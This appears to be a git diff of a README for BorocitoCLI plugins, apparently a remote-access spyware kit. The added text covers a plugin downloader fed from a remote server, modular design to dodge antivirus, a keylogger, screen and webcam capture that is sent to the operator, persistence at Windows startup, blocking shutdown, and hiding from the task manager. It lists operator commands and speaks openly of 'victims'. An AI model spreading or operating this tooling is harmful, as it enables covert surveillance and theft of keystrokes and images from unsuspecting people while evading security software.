@@ -7,12 +7,25 @@ These plugins were created to enrich the experience with BorocitoCLI.
 They're not perfect, but they're not disappointing either. Well, it really depends on how they're made. I invite you to contribute to the development of these, if there is something, an error, bug, an idea, etc, contribute, I will greatly appreciate it, and those of us who use these complements too.  
 
 ### Using it
-All plugins here, except for the 'boro-get' package manager, were created by Zhenboro. Yeah, and besides the fact that I made them, they need to be installed by 'boro-get'.  
+All plugins here were created by Zhenboro. Yeah, and besides the fact that I made them, they need to be installed by 'boro-get'.  
 boro-get is a module within BorocitoCLI. It's totally inside, well implemented. So, initially, there should be no problem.  
 
-#### boro-get
+### About
+BORO-GET tries to solve the following problem: Avoid over-loading the distributable executable. In addition, this gives freedom to create your own supplements and install them remotely. Total control. If you need a function, you can program it and implement it for yourself.  
+Not only that, we also avoid the signature of the antivirus. Well, for example, Brokiloger is very suspicious, it is a keys recorder. Thus the antivirus could only block that complement, but, not the instance of Borocito.
+
+### Repository
+On the server, the Boro-Get folder is where everything boro-get will use.
+You can leave the files that are within boron-get as they were when you downloaded them, this will make my repository be used located in my inventible "chemic-jug" server.   
+Also, if you want my server to provide you with the repository, you must modify the file 'GlobalSettingS.ini' that is in the Borocito Server-side root folder.   
+
+I really recommend you use my repository, upload updates with improvements, etc. So you avoid having to update your repository.  
+
+**Remember: it's just a repository. I can not steal the victims and either receive files either. It's just read-only**  
+### boro-get
 This must be installed, by default it is not implemented. It should be installed using the command `boro-get install`, to check if it is installed or not, use `boro-get status`, if it is already installed, great!  
-Now, if you want to be sure the latest version is installed, use `boro-get uninstall`, that will uninstall boro-get. Then you can use the `boro-get install` command to download and install the latest version available on the server indicated in the file: GlobalSettings.ini  
+Now, if you want to be sure the latest version is installed, use `boro-get uninstall`, that will uninstall boro-get. Then you can use the `boro-get install` command to download and install the latest version available on the server indicated in the file: GlobalSettings.ini and the file boro-get.txt thats inside boro-get.zip file (/Boro-Get/boro-get.zip)  
+
 ```sh
 [Components]
 boro-get=http://chemic-jug.000webhostapp.com/Borocito/Boro-Get/boro-get.zip
@@ -50,8 +63,8 @@ That will start an instance of boro-hear which will send your message to the ser
 
 
 ### broEstoraje
-This plugin is not coded yet.  
 It is used to explore files. Basically [RMTFS](https://github.com/Zhenboro/RMTFS) adapted to work with FTP (or IDFTP).  
+
 
 ### broKiloger
 broKiloger is a plugin dedicated to logging keys.  
@@ -85,6 +98,8 @@ boro-get broKiloger True /resetrecord
 boro-get broKiloger True /sendandexit
 ```  
 
+Can't undestand a shit? [Key mapping for broKiloger keylog](https://chemic-jug.000webhostapp.com/Borocito/Mapeo_Teclas_Kiloger.txt)
+
 ### broRescue
 This plugin was created because it turns out that sometimes an instance of BorocitoCLI can be closed by some external or internal factor. Perhaps the user noticed the presence and closed it, or, a command left a mess that BorocitoCLI couldn't handle.  
 For this reason, broRescue is a good recommendation that it be installed.  
@@ -100,26 +115,32 @@ Or even restart the computer with the command:
 And, you can also try to prevent the computer from being turned off. with `broRescue NoShutdown` to avoid or, `YesShutdown` to not try to avoid.  
 This packet reads directly from the server. Every 5 minutes. So yes, you will notice the effect in 5 minutes. And that is done so as not to load the server, and also so that it is not noticed from the task manager.  
 
+This comp will start with windows.  
+
 ### broScrincam
-This complement doesn't work.  
 
 This plugin is for:  
-- Take photos from a Webcam  
-- Record video from a Webcam  
+- Take photos from a Webcam (not coded yet)  
+- Record video from a Webcam (not coded yet)  
 - Record screen  
 
 > NOTE: Single Instance Package  
 
 ```sh
-/startscreenrecording: (will try) record the screen.
+/startscreenrecording: Will start to record the screen.
 boro-get broScrincam True /startscreenrecording
 ```  
 
 ```sh
-/stopscreenrecording: It is supposed to stop screen recording. That part is not scheduled yet.  
+/stopscreenrecording: It is supposed to stop screen recording. 
 boro-get broScrincam True /stopscreenrecording
 ```  
-> NOTE: It will not save or send the record. Not coded yet.  
+> NOTE: It will not save or send the record.
+
+```sh
+/sendscreenrecord: It stop, save and send the screen recording.
+boro-get broScrincam True /sendscreenrecord
+```  
 
 ```sh
 /startcamrecording: It will start to record video from the webcam
@@ -137,12 +158,6 @@ boro-get broScrincam True /takecampicture
 boro-get broScrincam True /stopcamrecording
 ```  
 > NOTE: It will not save or send the record.  
-
-```sh
-/sendscreenrecord: It is supposed to stop, save and send the screen recording. This part is not coded yet.
-boro-get broScrincam True /sendscreenrecord
-```  
-> NOTE: Not coded yet.  
 
 ```sh
 /sendcamrecord: It will stop the Webcam recording and send it automatically.
@@ -165,4 +180,5 @@ To uninstall, use the `boro-get <package> uninstall` command.
 An example with broKiloger would be:  
 `boro-get broKiloger uninstall`  
 
-The plugins created are not perfect. I recommend you take a look at the code to know what it does and how it does it, so you avoid unpredictable behavior or bad practices.  
+### WARNING
+**The plugins created are not perfect. I recommend you take a look at the code to know what it does and how it does it, so you avoid unpredictable behavior or bad practices.**
